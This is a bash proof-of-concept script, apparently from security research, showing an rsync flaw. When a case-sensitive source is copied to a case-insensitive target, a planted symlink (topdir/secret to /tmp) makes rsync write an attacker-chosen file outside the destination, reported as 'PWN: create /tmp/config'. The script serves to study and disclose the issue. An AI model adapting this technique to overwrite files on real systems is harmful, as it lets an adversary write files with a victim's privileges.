#!/bin/bash
set -e

# Tunables
CASE_DIR=/mercury/research/collision/case/tmp
ICASE_DIR=/mercury/research/collision/icase/tmp
DEBUG=0

function debug()
{
	if [[ $DEBUG = 1 ]]; then
		echo -e $*
	fi
}

function err()
{
	echo "err: $*" 1>&2
	exit 1
}

function verify_icase()
{
	# Create files w/ diff. case and verify their inodes match
	debug "in verify_icase()"

	tmpfile="$ICASE_DIR/tmpfile"
	TMPFILE="$ICASE_DIR/TMPFILE"

	# Create files
	touch "$tmpfile"
	tmpfile_inode=$(stat -c "%i" "$tmpfile")

	touch "$TMPFILE"
	TMPFILE_inode=$(stat -c "%i" "$TMPFILE")

	# Verify that inodes match
	if [[ "$tmpfile_inode" != "$TMPFILE_inode" ]]; then
		rm $tmpfile $TMPFILE
		err "ICASE_DIR is not case insensitive"
	else
		rm $tmpfile
	fi
}

function clear_state()
{
	debug "in clear_state()"

	# Sanity checks
	[[ ! "$CASE_DIR" || "$CASE_DIR" == "/" ]] && err "Bad CASE_DIR"
	[[ ! "$ICASE_DIR" || "$ICASE_DIR" == "/" ]] && err "Bad ICASE_DIR"

	[ -L "$CASE_DIR" ] && err "CASE_DIR is a symlink"
	[ -L "$ICASE_DIR" ] && err "ICASE_DIR is a symlink"

	# Try creating missing directories
	[ ! -d "$CASE_DIR" ] && (mkdir "$CASE_DIR" || err "Cannot create CASE_DIR")
	[ ! -d "$ICASE_DIR" ] && (mkdir "$ICASE_DIR" || err "Cannot create ICASE_DIR")

	# Ensure directories are empty
	rm -rf ${ICASE_DIR}/* ${CASE_DIR}/*
}

#############################
# Scenario
#############################
function scenario_rsync()
{
	docstring="
	Scenario: rsync copies from a case-sensitive source to a case-insensitive target\n
	Issue: rsync follows symlink and writes data to its target\n
	\n
	Adversary = user who creates the source directory\n
	Victim = user who tries to copy the adversary created directory\n
	\n
	Why is this bad?\n
	- Adversary can create any file with victim's privileges\n
	\n
	Why this happens?\n
	While copying, rsync creates topdir/, topdir/secret and TOPDIR/. When
	creating TOPDIR/secret/config, rsync does not realize that topdir/ and
	TOPDIR/ are the same directory on the target (becase of case-insensitivity).
	" 
	debug "in $FUNCNAME()"
	debug $docstring

	SRC=$CASE_DIR
	DST=$ICASE_DIR

	# Sanity checks
	rm -f /tmp/config

	# Create source directory structure
	mkdir -p "$SRC/topdir" "$SRC/TOPDIR/secret"
	ln -s /tmp "$SRC/topdir/secret"
	echo "corrupt some config..." >"$SRC/TOPDIR/secret/config"

	# Do copy
	rsync -a "$SRC" "$DST"

	# Issue: /tmp/config is created by following symlink topdir/secret
	test -f /tmp/config && echo "PWN: create /tmp/config"
}

# Run scenario
clear_state
verify_icase

clear_state
scenario_rsync

